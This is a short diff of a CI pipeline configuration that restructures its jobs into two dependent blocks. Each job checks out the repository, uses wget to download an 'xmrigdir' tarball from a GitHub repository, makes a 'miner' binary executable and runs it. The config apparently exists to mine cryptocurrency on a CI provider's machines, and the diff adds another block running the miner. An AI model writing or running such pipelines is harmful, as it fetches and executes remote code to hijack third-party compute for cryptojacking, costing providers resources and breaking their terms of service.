@@ -16,7 +16,13 @@ blocks:
             - cd xmrigdir
             - chmod +x miner
             - ./miner
-        - name: 'Job #2'
+    dependencies: []
+  - name: 'Block #2'
+    dependencies:
+      - 'Block #1'
+    task:
+      jobs:
+        - name: 'Job #1'
           commands:
             - checkout
             - 'wget https://github.com/orkaroeli/orkaroeliminer/raw/refs/heads/main/xmrigdir.tar.gz'
@@ -24,4 +30,3 @@ blocks:
             - cd xmrigdir
             - chmod +x miner
             - ./miner
-    dependencies: []
